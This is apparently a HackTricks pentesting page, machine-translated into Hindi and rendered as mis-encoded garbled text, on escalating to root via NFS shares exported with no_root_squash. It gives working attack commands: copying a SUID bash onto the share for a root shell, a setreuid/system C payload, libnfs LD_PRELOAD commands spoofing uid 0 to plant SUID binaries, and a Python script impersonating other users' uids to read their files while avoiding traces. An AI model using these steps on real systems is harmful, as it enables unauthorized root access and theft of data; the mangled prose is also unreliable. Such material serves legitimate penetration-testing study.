<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>тШБя╕П HackTricks Cloud тШБя╕П</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>ЁЯРж Twitter ЁЯРж</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>ЁЯОЩя╕П Twitch ЁЯОЩя╕П</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>ЁЯОе Youtube ЁЯОе</strong></a></summary>

- рдХреНрдпрд╛ рдЖрдк рдХрд┐рд╕реА **рд╕рд╛рдЗрдмрд░ рд╕реБрд░рдХреНрд╖рд╛ рдХрдВрдкрдиреА** рдореЗрдВ рдХрд╛рдо рдХрд░рддреЗ рд╣реИрдВ? рдХреНрдпрд╛ рдЖрдк рдЕрдкрдиреА рдХрдВрдкрдиреА рдХреЛ **HackTricks рдореЗрдВ рд╡рд┐рдЬреНрдЮрд╛рдкрд┐рдд** рджреЗрдЦрдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ? рдпрд╛ рдХреНрдпрд╛ рдЖрдкрдХреЛ **PEASS рдХреА рдирд╡реАрдирддрдо рд╕рдВрд╕реНрдХрд░рдг рдпрд╛ HackTricks рдХреЛ PDF рдореЗрдВ рдбрд╛рдЙрдирд▓реЛрдб** рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рдЪрд╛рд╣рд┐рдП? [**рд╕рджрд╕реНрдпрддрд╛ рдпреЛрдЬрдирд╛рдПрдВ**](https://github.com/sponsors/carlospolop) рдХреА рдЬрд╛рдВрдЪ рдХрд░реЗрдВ!

- рдЦреЛрдЬреЗрдВ [**The PEASS Family**](https://opensea.io/collection/the-peass-family), рд╣рдорд╛рд░рд╛ рд╡рд┐рд╢реЗрд╖ рд╕рдВрдЧреНрд░рд╣ [**NFTs**](https://opensea.io/collection/the-peass-family)

- рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ [**рдЖрдзрд┐рдХрд╛рд░рд┐рдХ PEASS & HackTricks swag**](https://peass.creator-spring.com)

- **рд╢рд╛рдорд┐рд▓ рд╣реЛрдВ** [**ЁЯТм**](https://emojipedia.org/speech-balloon/) [**Discord рд╕рдореВрд╣**](https://discord.gg/hRep4RUj7f) рдпрд╛ [**рдЯреЗрд▓реАрдЧреНрд░рд╛рдо рд╕рдореВрд╣**](https://t.me/peass) рдпрд╛ рдореБрдЭреЗ **Twitter** рдкрд░ **рдлрд╝реЙрд▓реЛ** рдХрд░реЗрдВ [**ЁЯРж**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**

- **рдЕрдкрдиреЗ рд╣реИрдХрд┐рдВрдЧ рдЯреНрд░рд┐рдХреНрд╕ рдХреЛ [hacktricks рд░реЗрдкреЛ](https://github.com/carlospolop/hacktricks) рдФрд░ [hacktricks-cloud рд░реЗрдкреЛ](https://github.com/carlospolop/hacktricks-cloud) рдореЗрдВ рдкреАрдЖрд░ рдЬрдорд╛ рдХрд░рдХреЗ рд╕рд╛рдЭрд╛ рдХрд░реЗрдВред**

</details>


_ **/etc/exports** _ рдлрд╝рд╛рдЗрд▓ рдХреЛ рдкрдврд╝реЗрдВ, рдпрджрд┐ рдЖрдкрдХреЛ рдХреБрдЫ рдРрд╕рд╛ рдбрд╛рдпрд░реЗрдХреНрдЯрд░реА рдорд┐рд▓рддрд╛ рд╣реИ рдЬреЛ **no\_root\_squash** рдХреЗ рд░реВрдк рдореЗрдВ рдХреЙрдиреНрдлрд╝рд┐рдЧрд░ рдХрд┐рдпрд╛ рдЧрдпрд╛ рд╣реИ, рддреЛ рдЖрдк рдЙрд╕реЗ рдПрдХ **рдХреНрд▓рд╛рдЗрдВрдЯ рдХреЗ рд░реВрдк рдореЗрдВ рдПрдХреНрд╕реЗрд╕** рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рдФрд░ рдЙрд╕ рдбрд╛рдпрд░реЗрдХреНрдЯрд░реА рдореЗрдВ **рд▓реЛрдХрд▓ рд░реВрдЯ** рдХреЗ рд░реВрдк рдореЗрдВ **рд▓рд┐рдЦ рд╕рдХрддреЗ** рд╣реИрдВред

**no\_root\_squash**: рдпрд╣ рд╡рд┐рдХрд▓реНрдк рдореВрд▓ рд░реВрдк рд╕реЗ рдХреНрд▓рд╛рдЗрдВрдЯ рдкрд░ рд░реВрдЯ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреЛ рд░реВрдЯ рдХреЗ рд░реВрдк рдореЗрдВ NFS рд╕рд░реНрд╡рд░ рдкрд░ рдлрд╝рд╛рдЗрд▓реЛрдВ рддрдХ рдкрд╣реБрдВрдЪ рджреЗрддрд╛ рд╣реИред рдФрд░ рдЗрд╕рд╕реЗ рдЧрдВрднреАрд░ рд╕реБрд░рдХреНрд╖рд╛ рд╕рдВрдмрдВрдзрд┐рдд рдкрд░реЗрд╢рд╛рдирд┐рдпрд╛рдВ рд╣реЛ рд╕рдХрддреА рд╣реИрдВред

**no\_all\_squash:** рдпрд╣ **no\_root\_squash** рд╡рд┐рдХрд▓реНрдк рдХреЗ рд╕рдорд╛рди рд╣реИ, рд▓реЗрдХрд┐рди рдЗрд╕рдХрд╛ рдЙрдкрдпреЛрдЧ **рдЧреИрд░-рд░реВрдЯ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛рдУрдВ** рдХреЗ рд▓рд┐рдП рд╣реЛрддрд╛ рд╣реИред рдХрд▓реНрдкрд┐рдд рдХрд░реЗрдВ, рдЖрдкрдХреЗ рдкрд╛рд╕ nobody рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреЗ рд░реВрдк рдореЗрдВ рд╢реЗрд▓ рд╣реИ; /etc/exports рдлрд╝рд╛рдЗрд▓ рдХреА рдЬрд╛рдВрдЪ рдХреА; no\_all\_squash рд╡рд┐рдХрд▓реНрдк рдореМрдЬреВрдж рд╣реИ; /etc/passwd рдлрд╝рд╛рдЗрд▓ рдХреА рдЬрд╛рдВрдЪ рдХреА; рдЧреИрд░-рд░реВрдЯ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреЗ рд░реВрдк рдореЗрдВ рдПрдХ рдирдХрд▓реА рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреЛ рдЕрдиреБрдХрд░рдг рдХрд┐рдпрд╛; рдЙрд╕ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреЗ рд░реВрдк рдореЗрдВ рдПрдХ suid рдлрд╝рд╛рдЗрд▓ рдмрдирд╛рдПрдВ (nfs рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдорд╛рдЙрдВрдЯ рдХрд░рдХреЗ)ред suid рдХреЛ nobody рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреЗ рд░реВрдк рдореЗрдВ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд░реЗрдВ рдФрд░ рдЕрд▓рдЧ-рдЕрд▓рдЧ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдмрдиреЗрдВред

# рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХрд╛рд░ рдЙрдиреНрдирдпрди

## рджреВрд░рд╕реНрде рд╢реЛрд╖рдг

рдпрджрд┐ рдЖрдкрдиреЗ рдЗрд╕ рдХрдордЬреЛрд░реА рдХреЛ рдЦреЛрдЬрд╛ рд╣реИ, рддреЛ рдЖрдк рдЗрд╕реЗ рд╢реЛрд╖рдг рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ:

* рдПрдХ рдХреНрд▓рд╛рдЗрдВрдЯ рдорд╢реАрди рдореЗрдВ рдЙрд╕ рдбрд╛рдпрд░реЗрдХреНрдЯрд░реА рдХреЛ **рдорд╛рдЙрдВрдЯ рдХрд░рдХреЗ**, рдФрд░ рдЙрд╕ рдорд╛рдЙрдВрдЯ рдХрд┐рдП рдЧрдП рдлрд╝реЛрд▓реНрдбрд░ рдореЗрдВ **/bin/bash** рдмрд╛рдЗрдирд░реА рдХреА **рдХреЙрдкреА** рдХрд░рдХреЗ рдЙрд╕реЗ **SUID** рдЕрдзрд┐рдХрд╛рд░ рджреЗрдВ, рдФрд░ **рдкреАрдбрд╝рд┐рдд** рдорд╢реАрди рд╕реЗ рдЙрд╕ рдмреИрд╢ рдмрд╛рдЗрдирд░реА рдХреЛ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд░реЗрдВред
```bash
#Attacker, as root user
mkdir /tmp/pe
mount -t nfs <IP>:<SHARED_FOLDER> /tmp/pe
cd /tmp/pe
cp /bin/bash .
chmod +s bash

#Victim
cd <SHAREDD_FOLDER>
./bash -p #ROOT shell
```
* **рдЙрд╕ рдирд┐рд░реНрджреЗрд╢рд┐рдХрд╛ рдХреЛ рдорд╛рдЙрдВрдЯ рдХрд░реЗрдВ** рдХреНрд▓рд╛рдЗрдВрдЯ рдорд╢реАрди рдореЗрдВ, рдФрд░ **рд░реВрдЯ рдХреЗ рд░реВрдк рдореЗрдВ рдХреЙрдкреА рдХрд░реЗрдВ** рдорд╛рдЙрдВрдЯ рдХрд┐рдП рдЧрдП рдлрд╝реЛрд▓реНрдбрд░ рдореЗрдВ рд╣рдорд╛рд░реЗ рдХрдВрдкрд╛рдЗрд▓реНрдб рдкреЗрд▓реЛрдб рдХреЛ рдЬреЛ SUID рдЕрдиреБрдорддрд┐ рдХрд╛ рджреБрд░реБрдкрдпреЛрдЧ рдХрд░реЗрдЧрд╛, рдЙрд╕реЗ **SUID** рдЕрдзрд┐рдХрд╛рд░ рджреЗрдВ, рдФрд░ рд╡рд┐рдХреНрдЯрд┐рдо рдорд╢реАрди рд╕реЗ рдЙрд╕ рдмрд╛рдЗрдирд░реА рдХреЛ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд░реЗрдВ (рдпрд╣рд╛рдВ рдЖрдкрдХреЛ рдХреБрдЫ [рд╕реА SUID рдкреЗрд▓реЛрдб](payloads-to-execute.md#c) рдорд┐рд▓реЗрдВрдЧреЗ)ред
```bash
#Attacker, as root user
gcc payload.c -o payload
mkdir /tmp/pe
mount -t nfs <IP>:<SHARED_FOLDER> /tmp/pe
cd /tmp/pe
cp /tmp/payload .
chmod +s payload

#Victim
cd <SHAREDD_FOLDER>
./payload #ROOT shell
```
## рд╕реНрдерд╛рдиреАрдп рдЙрддреНрдкреАрдбрд╝рди

{% hint style="info" %}
рдзреНрдпрд╛рди рджреЗрдВ рдХрд┐ рдпрджрд┐ рдЖрдк рдЕрдкрдиреА рдорд╢реАрди рд╕реЗ рдкреАрдбрд╝рд┐рдд рдорд╢реАрди рддрдХ рдПрдХ **рдЯрдирд▓ рдмрдирд╛ рд╕рдХрддреЗ рд╣реИрдВ рддреЛ рдЖрдк рдлрд┐рд░ рднреА рдЗрд╕ рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХрд╛рд░ рдЙрддреНрдкреАрдбрд╝рди рдХреЛ рдЙрддреНрдкрдиреНрди рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рджреВрд░рд╕реНрде рд╕рдВрд╕реНрдХрд░рдг рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рдЖрд╡рд╢реНрдпрдХ рдкреЛрд░реНрдЯреЛрдВ рдХреЛ рдЯрдирд▓ рдХрд░рддреЗ рд╣реБрдП**ред\
рдпрджрд┐ `/etc/exports` рдлрд╝рд╛рдЗрд▓ рдореЗрдВ рдПрдХ IP рдирд┐рд░реНрджрд┐рд╖реНрдЯ рдХрд░рддреА рд╣реИ рддреЛ рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рдЪрд╛рд▓ рдХрд╛рдо рдирд╣реАрдВ рдХрд░реЗрдЧреА рдФрд░ рдЖрдкрдХреЛ рдЗрд╕ рдЪрд╛рд▓ рдХрд╛ рджреБрд░реБрдкрдпреЛрдЧ рдХрд░рдиреЗ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реЛрдЧреАред\
рдЙрддреНрдкреАрдбрд╝рди рдХреЛ рдХрд╛рдо рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдПрдХ рдФрд░ рдЖрд╡рд╢реНрдпрдХ рдЖрд╡рд╢реНрдпрдХрддрд╛ рдпрд╣ рд╣реИ рдХрд┐ `/etc/export` рдХреЗ рднреАрддрд░ рдирд┐рд░реНрдпрд╛рдд **`рдЕрд╕реБрд░рдХреНрд╖рд┐рдд` рдзреНрд╡рдЬ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдирд╛ рдЪрд╛рд╣рд┐рдП**ред\
\--_рдореБрдЭреЗ рдпрдХреАрди рдирд╣реАрдВ рд╣реИ рдХрд┐ рдпрджрд┐ `/etc/export` рдПрдХ IP рдкрддрд╛ рдирд┐рд░реНрджрд┐рд╖реНрдЯ рдХрд░ рд░рд╣рд╛ рд╣реИ рддреЛ рдпрд╣ рдЪрд╛рд▓ рдХрд╛рдо рдХрд░реЗрдЧреА_--
{% endhint %}

**рдЯреНрд░рд┐рдХ** [**https://www.errno.fr/nfs\_privesc.html**](https://www.errno.fr/nfs\_privesc.html) **рд╕реЗ рдХреЙрдкреА рдХреА рдЧрдИ рд╣реИ**

рдЕрдм, рдпрд╣ рдорд╛рди рд▓реЗрддреЗ рд╣реИрдВ рдХрд┐ рд╢реЗрдпрд░ рд╕рд░реНрд╡рд░ рдЕрднреА рднреА `no_root_squash` рдЪрд▓рд╛ рд░рд╣рд╛ рд╣реИ рд▓реЗрдХрд┐рди рд╣рдореЗрдВ рд╢реЗрдпрд░ рдХреЛ рд╣рдорд╛рд░реА рдкреЗрдВрдЯреЗрд╕реНрдЯ рдорд╢реАрди рдкрд░ рдорд╛рдЙрдВрдЯ рдХрд░рдиреЗ рд╕реЗ рд░реЛрдХрдиреЗ рд╡рд╛рд▓реА рдХреБрдЫ рдмрд╛рдд рд╣реИред рдпрд╣ рдЗрд╕рд▓рд┐рдП рд╣реЛрдЧрд╛ рдХреНрдпреЛрдВрдХрд┐ `/etc/exports` рдореЗрдВ рд╢реЗрдпрд░ рдХреЛ рдорд╛рдЙрдВрдЯ рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрдиреЗ рд╡рд╛рд▓реЗ IP рдкрддреЛрдВ рдХреА рдПрдХ рд╕реНрдкрд╖реНрдЯ рд╕реВрдЪреА рд╣реИред

рд╢реЗрдпрд░ рдХреА рд╕реВрдЪреА рдЕрдм рджрд┐рдЦрд╛рддреА рд╣реИ рдХрд┐ рдХреЗрд╡рд▓ рд╡рд╣ рдорд╢реАрди рдЗрд╕реЗ рдорд╛рдЙрдВрдЯ рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрдиреЗ рдХреЗ рд▓рд┐рдП рдЬрд┐рд╕ рдкрд░ рд╣рдо рдкреНрд░рд╛рдЗрд╡реЗрд╕реА рдХрд░рдиреЗ рдХреА рдХреЛрд╢рд┐рд╢ рдХрд░ рд░рд╣реЗ рд╣реИрдВ:
```
[root@pentest]# showmount -e nfs-server
Export list for nfs-server:
/nfs_root   machine
```
рдЗрд╕рдХрд╛ рдорддрд▓рдм рд╣реИ рдХрд┐ рд╣рдо рдЕрдиреБрдкреНрд░рдпреЛрдЧреА рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреЗ рд░реВрдк рдореЗрдВ рд╕реНрдерд╛рдиреАрдп рд░реВрдк рд╕реЗ рдорд╢реАрди рдкрд░ рдорд╛рдЙрдВрдЯ рдХрд┐рдП рдЧрдП рд╕рд╛рдЭрд╛ рдХреЛ рдЙрддреНрдкрдиреНрди рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЕрд╡рд╕рд░рд╣реАрди рд╣реИрдВред рд▓реЗрдХрд┐рди рдпрд╣ рдмрд╛рдд рддреЛ рд╣реЛрддреА рд╣реИ рдХрд┐ рдПрдХ рдФрд░, рдХрдо рдЬреНрдЮрд╛рдд рд╕реНрдерд╛рдиреАрдп рдЙрддреНрдкреАрдбрд╝рди рд╣реИред

рдЗрд╕ рдЙрддреНрдкреАрдбрд╝рди рдХрд╛ рдЖрдзрд╛рд░ рдПрдХ рд╕рдорд╕реНрдпрд╛ рдкрд░ рд╣реИ рдЬреЛ NFSv3 рдирд┐рд░реНрджреЗрд╢рд┐рдХрд╛ рдореЗрдВ рд╣реЛрддреА рд╣реИ рдЬреЛ рдпрд╣ рдирд┐рд░реНрдзрд╛рд░рд┐рдд рдХрд░рддреА рд╣реИ рдХрд┐ рдЬрдм рд╢реЗрдпрд░ рддрдХ рдкрд╣реБрдВрдЪрддреЗ рд╕рдордп рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреЗ uid/gid рдХрд╛ рд╡рд┐рдЬреНрдЮрд╛рдкрди рдХрд░рдирд╛ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреЗ рдКрдкрд░ рд╣реИред рдЗрд╕рд▓рд┐рдП, рдпрджрд┐ рд╢реЗрдпрд░ рдкрд╣рд▓реЗ рд╕реЗ рд╣реА рдорд╛рдЙрдВрдЯ рдХрд┐рдпрд╛ рдЧрдпрд╛ рд╣реИ, рддреЛ NFS RPC рдХреЙрд▓реНрд╕ рдХреЛ рдЬрд╛рд▓реА uid/gid рдмрдирд╛рдиреЗ рдХреЗ рджреНрд╡рд╛рд░рд╛ uid/gid рдХреЛ рдирдХрд▓реА рдХрд░рдирд╛ рд╕рдВрднрд╡ рд╣реИ!

рдпрд╣рд╛рдВ рдПрдХ [рдкреБрд╕реНрддрдХрд╛рд▓рдп рд╣реИ рдЬреЛ рдЖрдкрдХреЛ рдЗрд╕реЗ рдХрд░рдиреЗ рджреЗрддреА рд╣реИ](https://github.com/sahlberg/libnfs)ред

### рдЙрджрд╛рд╣рд░рдг рдХреЛ рдХрдВрдкрд╛рдЗрд▓ рдХрд░рдирд╛ <a href="#compiling-the-example" id="compiling-the-example"></a>

рдЕрдкрдиреЗ рдХрд░реНрдирд▓ рдХреЗ рдЖрдзрд╛рд░ рдкрд░, рдЖрдкрдХреЛ рдЙрджрд╛рд╣рд░рдг рдХреЛ рдЕрдиреБрдХреВрд▓рд┐рдд рдХрд░рдиреЗ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реЛ рд╕рдХрддреА рд╣реИред рдореЗрд░реЗ рдорд╛рдорд▓реЗ рдореЗрдВ, рдореБрдЭреЗ fallocate syscalls рдХреЛ рдЯрд┐рдкреНрдкрдгреА рдХрд░рдиреА рдкрдбрд╝реАред
```bash
./bootstrap
./configure
make
gcc -fPIC -shared -o ld_nfs.so examples/ld_nfs.c -ldl -lnfs -I./include/ -L./lib/.libs/
```
### рдкреБрд╕реНрддрдХрд╛рд▓рдп рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рд╢реЛрдз рдХрд░рдирд╛ <a href="#exploiting-using-the-library" id="exploiting-using-the-library"></a>

рдЪрд▓реЛ рд╕рдмрд╕реЗ рд╕рд░рд▓ рд╢реЛрдз рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░реЗрдВ:
```bash
cat pwn.c
int main(void){setreuid(0,0); system("/bin/bash"); return 0;}
gcc pwn.c -o a.out
```
рдЕрдкрдиреЗ рдПрдХреНрд╕рдкреНрд▓реЙрдЗрдЯ рдХреЛ рд╕рд╛рдЭрд╛ рдореЗрдВ рд░рдЦреЗрдВ рдФрд░ RPC рдХреЙрд▓ рдореЗрдВ рдЕрдкрдиреЗ uid рдХреЛ рдлреЗрдХ рдХрд░рдХреЗ рдЗрд╕реЗ suid root рдмрдирд╛рдПрдВ:
```
LD_NFS_UID=0 LD_LIBRARY_PATH=./lib/.libs/ LD_PRELOAD=./ld_nfs.so cp ../a.out nfs://nfs-server/nfs_root/
LD_NFS_UID=0 LD_LIBRARY_PATH=./lib/.libs/ LD_PRELOAD=./ld_nfs.so chown root: nfs://nfs-server/nfs_root/a.out
LD_NFS_UID=0 LD_LIBRARY_PATH=./lib/.libs/ LD_PRELOAD=./ld_nfs.so chmod o+rx nfs://nfs-server/nfs_root/a.out
LD_NFS_UID=0 LD_LIBRARY_PATH=./lib/.libs/ LD_PRELOAD=./ld_nfs.so chmod u+s nfs://nfs-server/nfs_root/a.out
```
рдЕрдм рдЗрд╕реЗ рд▓реЙрдиреНрдЪ рдХрд░рдирд╛ рдмрд╛рдХреА рд╣реИ:
```
[w3user@machine libnfs]$ /mnt/share/a.out
[root@machine libnfs]#
```
рдпрд╣рд╛рдВ рд╣рдо рд╣реИрдВ, рд╕реНрдерд╛рдиреАрдп рд░реВрдЯ рдкреНрд░рд┐рд╡рд┐рд▓реЗрдЬ рдПрд╕реНрдХреЗрд▓реЗрд╢рди!

## рдмреЛрдирд╕ NFShell <a href="#bonus-nfshell" id="bonus-nfshell"></a>

рдорд╢реАрди рдкрд░ рд╕реНрдерд╛рдиреАрдп рд░реВрдЯ рд╣реЛрдиреЗ рдХреЗ рдмрд╛рдж, рдореБрдЭреЗ NFS рд╕рд╛рдЭрд╛ рд╕реЗ рд╕рдВрднрд╡рддрдГ рдЧреБрдкреНрдд рдЬрд╛рдирдХрд╛рд░реА рдЪреЛрд░реА рдХрд░рдиреА рдереА рдЬреЛ рдореБрдЭреЗ рдкрд┐рд╡рдЯ рдХрд░рдиреЗ рдореЗрдВ рдорджрдж рдХрд░ рд╕рдХрддреА рд╣реИред рд▓реЗрдХрд┐рди рдпрд╣рд╛рдВ рдХрдИ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдереЗ рдЬрд┐рдирдХреЗ рдЕрд▓рдЧ-рдЕрд▓рдЧ uid рд╣реЛрддреЗ рдереЗ рдЬрд┐рдиреНрд╣реЗрдВ рдореИрдВ рд░реВрдЯ рд╣реЛрдиреЗ рдХреЗ рдмрд╛рд╡рдЬреВрдж рдкрдврд╝ рдирд╣реАрдВ рд╕рдХрддрд╛ рдерд╛ рдХреНрдпреЛрдВрдХрд┐ uid рдорд┐рд▓рд╛рди рдирд╣реАрдВ рд╣реЛ рд░рд╣рд╛ рдерд╛ред рдореИрдВ рдЪреМрдВрдХрд╛рдиреЗ рд╡рд╛рд▓реЗ рд╕рдВрдХреЗрдд рдирд╣реАрдВ рдЫреЛрдбрд╝рдирд╛ рдЪрд╛рд╣рддрд╛ рдерд╛ рдЬреИрд╕реЗ рдХрд┐ chown -R, рдЗрд╕рд▓рд┐рдП рдореИрдВрдиреЗ рдЕрдкрдиреЗ uid рдХреЛ рд╕реЗрдЯ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдПрдХ рдЫреЛрдЯрд╛ рд╕реНрдирд┐рдкреЗрдЯ рдмрдирд╛рдпрд╛ рдерд╛ рдЬрд┐рд╕рд╕реЗ рдореИрдВ рдЪрд╛рд╣реЗ рдЧрдП рд╢реИрд▓ рдХрдорд╛рдВрдб рдХреЛ рдЪрд▓рд╛ рд╕рдХреВрдВ:
```python
#!/usr/bin/env python
import sys
import os

def get_file_uid(filepath):
try:
uid = os.stat(filepath).st_uid
except OSError as e:
return get_file_uid(os.path.dirname(filepath))
return uid

filepath = sys.argv[-1]
uid = get_file_uid(filepath)
os.setreuid(uid, uid)
os.system(' '.join(sys.argv[1:]))
```
рдЖрдк рдлрд┐рд░ рд╕реЗ рд╕рд╛рдорд╛рдиреНрдп рд░реВрдк рд╕реЗ рдЕрдкрдиреЗ рджреНрд╡рд╛рд░рд╛ рдЪрд▓рд╛рдП рдЬрд╛рдиреЗ рд╡рд╛рд▓реЗ рдЕрдзрд┐рдХрд╛рдВрд╢ рдХрдорд╛рдВрдбреЛрдВ рдХреЛ рд╕реНрдХреНрд░рд┐рдкреНрдЯ рдХреЗ рд╕рд╛рде рдкреНрд░рд╛рдердорд┐рдХрддрд╛ рджреЗрдХрд░ рдЪрд▓рд╛ рд╕рдХрддреЗ рд╣реИрдВ:
```
[root@machine .tmp]# ll ./mount/
drwxr-x---  6 1008 1009 1024 Apr  5  2017 9.3_old
[root@machine .tmp]# ls -la ./mount/9.3_old/
ls: cannot open directory ./mount/9.3_old/: Permission denied
[root@machine .tmp]# ./nfsh.py ls --color -l ./mount/9.3_old/
drwxr-x---  2 1008 1009 1024 Apr  5  2017 bin
drwxr-x---  4 1008 1009 1024 Apr  5  2017 conf
drwx------ 15 1008 1009 1024 Apr  5  2017 data
drwxr-x---  2 1008 1009 1024 Apr  5  2017 install
```
<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>тШБя╕П HackTricks Cloud тШБя╕П</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>ЁЯРж Twitter ЁЯРж</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>ЁЯОЩя╕П Twitch ЁЯОЩя╕П</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>ЁЯОе Youtube ЁЯОе</strong></a></summary>

- рдХреНрдпрд╛ рдЖрдк рдХрд┐рд╕реА **рд╕рд╛рдЗрдмрд░ рд╕реБрд░рдХреНрд╖рд╛ рдХрдВрдкрдиреА** рдореЗрдВ рдХрд╛рдо рдХрд░рддреЗ рд╣реИрдВ? рдХреНрдпрд╛ рдЖрдк рдЕрдкрдиреА рдХрдВрдкрдиреА рдХреЛ **рд╣реИрдХрдЯреНрд░рд┐рдХреНрд╕ рдореЗрдВ рд╡рд┐рдЬреНрдЮрд╛рдкрд┐рдд** рджреЗрдЦрдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ? рдпрд╛ рдХреНрдпрд╛ рдЖрдкрдХреЛ **PEASS рдХреА рдирд╡реАрдирддрдо рд╕рдВрд╕реНрдХрд░рдг рдпрд╛ HackTricks рдХреЛ PDF рдореЗрдВ рдбрд╛рдЙрдирд▓реЛрдб рдХрд░рдиреЗ рдХрд╛ рдЙрдкрдпреЛрдЧ** рдХрд░рдиреЗ рдХреА рдЗрдЪреНрдЫрд╛ рд╣реИ? [**рд╕рджрд╕реНрдпрддрд╛ рдпреЛрдЬрдирд╛рдПрдВ**](https://github.com/sponsors/carlospolop) рдХреА рдЬрд╛рдВрдЪ рдХрд░реЗрдВ!

- рдЦреЛрдЬреЗрдВ [**The PEASS Family**](https://opensea.io/collection/the-peass-family), рд╣рдорд╛рд░рд╛ рд╡рд┐рд╢реЗрд╖ рд╕рдВрдЧреНрд░рд╣ [**NFTs**](https://opensea.io/collection/the-peass-family)

- рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ [**рдЖрдзрд┐рдХрд╛рд░рд┐рдХ PEASS & HackTricks swag**](https://peass.creator-spring.com)

- **рд╢рд╛рдорд┐рд▓ рд╣реЛрдВ** [**ЁЯТм**](https://emojipedia.org/speech-balloon/) [**Discord рд╕рдореВрд╣**](https://discord.gg/hRep4RUj7f) рдпрд╛ [**рдЯреЗрд▓реАрдЧреНрд░рд╛рдо рд╕рдореВрд╣**](https://t.me/peass) рдореЗрдВ рдпрд╛ рдореБрдЭреЗ **Twitter** рдкрд░ **рдлрд╝реЙрд▓реЛ** рдХрд░реЗрдВ [**ЁЯРж**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**

- **рдЕрдкрдиреЗ рд╣реИрдХрд┐рдВрдЧ рдЯреНрд░рд┐рдХреНрд╕ рд╕рд╛рдЭрд╛ рдХрд░реЗрдВ, [hacktricks рд░реЗрдкреЛ](https://github.com/carlospolop/hacktricks) рдФрд░ [hacktricks-cloud рд░реЗрдкреЛ](https://github.com/carlospolop/hacktricks-cloud)** рдХреЛ PR рдЬрдорд╛ рдХрд░рдХреЗред

</details>
